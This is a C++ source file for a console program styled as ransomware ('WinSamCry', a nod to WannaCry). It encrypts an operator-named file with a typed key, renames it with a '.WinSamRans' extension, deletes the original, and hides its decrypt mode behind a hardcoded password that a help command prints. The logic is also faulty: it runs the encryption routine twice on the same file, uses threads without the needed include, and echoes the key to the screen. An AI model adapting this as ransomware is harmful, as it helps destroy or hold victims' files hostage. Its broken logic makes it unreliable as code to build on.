#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include "code/sys.h"
#include <Windows.h>
using namespace std;

int main()
{
	SetConsoleTitle("WannaCry , nah just kidding it's WinSamCry");
	string data1, data2, key, mode, check;
	top:
	cout << "PRESS E to perform encryption" << endl;
	getline(cin, mode);
	if (mode == "E" || mode == "e")
	{
		cout << "Please enter your key" << endl;
		getline(cin, key);
		cout << "Please enter your key again" << endl;
		getline(cin, check);
		if (key != check)
		{
			exit(0);
		}
		else
		{
			cout << "Enter the file input name" << endl;
			getline(cin, data1);
			data2 = data1 + ".WinSamRans";
			readSystem(data1, data2, key, mode);
			thread tmain(readSystem, data1, data2, key, mode);
			tmain.join();
			
			if (remove(data1.c_str()) != 0)
			{
				cout << "Failed to remove the Original folder (it might open by someone else)" << endl;
				perror("Error deleting file");
			}
			else
			{ 
				puts("File successfully deleted & file is encrypted ");
			}
			system("pause");
		}
	}
	else if (mode == "*help*")
	{
		cout << "Password is :mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U" << endl;
		goto top;
	}
	else if (mode == "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U")
	{
		mode = "D";
		cout << "Please enter your key" << endl;
		getline(cin, key);
		check = key;
		cout << check << endl;
		cout << "Enter the file input name" << endl;
		getline(cin, data1);
		int temp = data1.length();
		string tempp = data1.substr(0, temp - 11);
		cout << "tempp is " << tempp << endl;
		data2 = tempp;
		readSystem(data1, data2, key, mode);
		thread tmain(readSystem, data1, data2, key, mode);
		tmain.join();
		system("pause");
	}
	else
	{
		cout << "Program Quitted";
	}
	
	return 0;
}

